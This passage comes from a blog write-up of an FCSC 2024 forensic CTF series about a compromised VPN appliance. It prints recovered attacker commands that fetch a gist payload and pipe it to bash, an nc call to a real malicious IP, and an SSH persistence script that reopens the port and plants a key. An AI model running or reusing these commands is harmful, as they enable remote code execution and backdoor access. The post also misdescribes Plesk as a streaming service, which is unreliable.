</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;cat /tmp/a | grep &#34;name&#34; | /pkg/uniq | cut -d &#34;:&#34; -f 2 | cut -d \&#39;</span><span style="color:#e6db74">&#34;\&#39; -f 2 | tr -d \&#39;\n\&#39; | grep -o . | tac | tr -d \&#39;\n\&#39;  &gt; /tmp/b&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b&#39;a=`cat /tmp/b`;b=</span><span style="color:#e6db74">${</span>a:4:32<span style="color:#e6db74">}</span><span style="color:#e6db74">;c=&#34;</span>https://api.github.com/gists/<span style="color:#e6db74">${</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;;/home/bin/curl -k -s </span><span style="color:#e6db74">${</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74"> | grep \&#39;raw_url\&#39; | cut -d \&#39;&#34;</span><span style="color:#ae81ff">\&#39;</span> -f <span style="color:#ae81ff">4</span> &gt; /tmp/c<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b&#39;</span>c<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /tmp/c<span style="color:#e6db74">`</span>;/home/bin/curl -k <span style="color:#e6db74">${</span>c<span style="color:#e6db74">}</span> -s | bash<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b&#39;</span>rm /tmp/a /tmp/b /tmp/c<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b&#39;</span>nc 146.0.228.66:1337<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><h2 id="45---simple-persistence">4/5 - Simple persistence</h2>
<blockquote>
<p>You notice that a built-in feature of your equipment is no longer working and you wonder whether the attacker has used the first persistence to install a second, less &lsquo;visible&rsquo; persistence&hellip;</p>
<p>You look for the characteristics of this second persistence: protocol used, port used, path to the configuration file that was modified, path to the file that was modified in order to establish persistence.</p>
</blockquote>
<p>Here you have to work like an ant and re-execute the previous commands to retrace the attacker&rsquo;s steps, preferably in a VM. As luck would have it, Github is still available.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits<span style="color:#ae81ff">\?</span>per_page<span style="color:#ae81ff">\=</span><span style="color:#ae81ff">50</span> -o a
</span></span><span style="display:flex;"><span>$ cat a | grep <span style="color:#e6db74">&#34;name&#34;</span> | uniq | cut -d <span style="color:#e6db74">&#34;:&#34;</span> -f <span style="color:#ae81ff">2</span> | cut -d <span style="color:#e6db74">&#39;&#34;&#39;</span> -f <span style="color:#ae81ff">2</span> | tr -d <span style="color:#e6db74">&#39;\n&#39;</span> | grep -o . | tac | tr -d <span style="color:#e6db74">&#39;\n&#39;</span>  &gt; b
</span></span><span style="display:flex;"><span>$ a<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat b<span style="color:#e6db74">`</span>;b<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>a:4:32<span style="color:#e6db74">}</span>;c<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://api.github.com/gists/</span><span style="color:#e6db74">${</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;curl -k -s <span style="color:#e6db74">${</span>c<span style="color:#e6db74">}</span> | grep <span style="color:#e6db74">&#39;raw_url&#39;</span> | cut -d <span style="color:#e6db74">&#39;&#34;&#39;</span> -f <span style="color:#ae81ff">4</span> &gt; c
</span></span><span style="display:flex;"><span>$ c<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat c<span style="color:#e6db74">`</span>;curl -k <span style="color:#e6db74">${</span>c<span style="color:#e6db74">}</span> -s &gt; final
</span></span><span style="display:flex;"><span>$ cat a b c final
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;s/port 830/port 1337/&#39;</span> /data/runtime/etc/ssh/sshd_server_config &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;s/ForceCommand/#ForceCommand/&#39;</span> /data/runtime/etc/ssh/sshd_server_config &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;PubkeyAuthentication yes&#34;</span> &gt;&gt; /data/runtime/etc/ssh/sshd_server_config
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub&#34;</span> &gt;&gt; /data/runtime/etc/ssh/sshd_server_config
</span></span><span style="display:flex;"><span>pkill sshd-ive &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>gzip -d /data/pkg/data-backup.tgz &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>gzip /data/pkg/data-backup.tar &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>So we see that it has modified the SSH configuration to point to port 1337, and the backup file (after killing the process ðŸ¤”, maybe it&rsquo;s not automatic) to keep its persistence.</p>
<p>This allows us to validate.</p>
<h2 id="55---a-little-cti">5/5 - A little CTI</h2>
<blockquote>
<p>You&rsquo;ve almost finished your analysis! All that remains is to qualify the IP address present in the last command used by the attacker. You need to determine which attacker group this IP address belongs to, as well as the legitimate management interface that was exposed on this IP address at the time of the attack.</p>
<p>The flag is in the format: FCSC<!-- raw HTML omitted -->:<!-- raw HTML omitted -->}.</p>
<p>Note: This is a genuine malicious IP address, do not interact with this IP address directly.</p>
</blockquote>
<p>The last command was <code>nc 146.0.228.66:1337</code>.</p>
<p>In this case, you don&rsquo;t need to look very far. We saw in the previous steps that Mandiant identified this operating mode as <strong>UNC5221</strong> (UNC for Uncategorized) and the IP is known to VirusTotal.</p>
<p>VirusTotal&rsquo;s DNS replications do not point to particularly malicious sites, but the historical SSL certificates are a red flag.</p>
<p><code>zen-snyder.146-0-228-66.**plesk**.page</code>
<img src="/images/FCSC2024/19aff73bcefa9617afe4b06b08923153.png" alt="image"></p>
<p><code>Plesk</code> is a self-hosted, paid streaming service. It is a historically vulnerable service, and as these instances are often exposed on the Internet (because users want to share their media with their friends), and as they require a considerable amount of bandwidth, they serve as very good anonymous C2 servers for attackers of all kinds.</p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
        <li><a href="../../index.html">Home</a></li>
    
        <li><a href="../index.html">Categories</a></li>
      
        <li><a href="../../ranking/index.html">Ranking</a></li>
      
        <li><a href="../../whoami/index.html">Whoami</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#15---encrypted-archive">1/5 - Encrypted archive</a></li>
    <li><a href="#25---initial-access">2/5 - Initial access</a></li>
    <li><a href="#35---simple-persistence">3/5 - Simple persistence</a></li>
    <li><a href="#45---simple-persistence">4/5 - Simple persistence</a></li>
    <li><a href="#55---a-little-cti">5/5 - A little CTI</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&text=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&title=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&is_video=false&description=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic&body=Check out this article: https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&title=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&title=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&name=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic&description=Introduction%20You%26rsquo%3bve%20just%20been%20hired%20as%20Information%20Systems%20Security%20Manager%20%28ISSM%29%20for%20a%20strategic%20company.%0aWhen%20you%20arrive%20at%20your%20office%20on%20your%20first%20day%2c%20you%20realise%20that%20your%20predecessor%20has%20left%20you%20a%20USB%20stick%20with%20a%20note%20on%20it%3a%20VPN%20compromised%20%28integrity%29.%20Version%2022.3R1%20b1647.%0aNote%3a%20The%20first%20part%20%28Encrypted%20Archive%29%20unlocks%20the%20other%20parts%2c%20with%20the%20exception%20of%20the%20second%20part%20%28Initial%20Access%29%20which%20can%20be%20processed%20independently." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&t=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  Imad 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="../../index.html">Home</a></li>
    
        <li><a href="../index.html">Categories</a></li>
      
        <li><a href="../../ranking/index.html">Ranking</a></li>
      
        <li><a href="../../whoami/index.html">Whoami</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>




</html>
